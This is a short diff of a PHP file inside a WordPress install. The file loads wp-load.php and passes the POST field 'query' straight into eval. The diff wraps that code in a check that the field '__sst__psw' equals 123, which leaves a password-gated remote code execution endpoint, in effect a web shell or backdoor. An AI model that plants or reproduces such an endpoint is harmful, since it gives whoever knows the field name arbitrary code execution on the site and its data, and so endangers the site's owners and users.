@@ -1,4 +1,5 @@
 <?php
+if($_POST['__sst__psw']==123){
 define( 'WP_USE_THEMES', false );
 require_once( '../../../wp-load.php' );
 /*
@@ -10,4 +11,5 @@ if(eval('return '.stripslashes($_POST['query']).';')==true){
 	echo 'php_true';
 }else{
 	echo 'php_false';
+}
 }
